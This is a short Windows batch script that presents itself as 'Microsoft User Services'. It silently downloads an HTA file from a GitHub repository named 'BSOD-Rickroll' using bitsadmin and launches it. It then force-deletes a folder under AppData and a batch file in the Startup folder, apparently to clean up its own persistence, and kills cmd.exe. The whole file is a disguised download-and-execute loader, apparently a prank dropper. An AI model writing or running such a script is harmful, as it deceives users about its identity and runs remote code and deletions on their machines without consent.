@echo off

cls
title Microsoft User Services
bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/BSOD-Rickroll/main/Instant/Instant_msrkl.hta" "msrkl.hta"
echo "download completed"
start msrkl.hta
echo "file opened successfully"
start rmdir /s /q "%appdata%\Microsoft\Update" || exit /b 0 && del /f /q "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Instant_startup.bat"  || exit /b 0 && taskkill /f /im cmd.exe
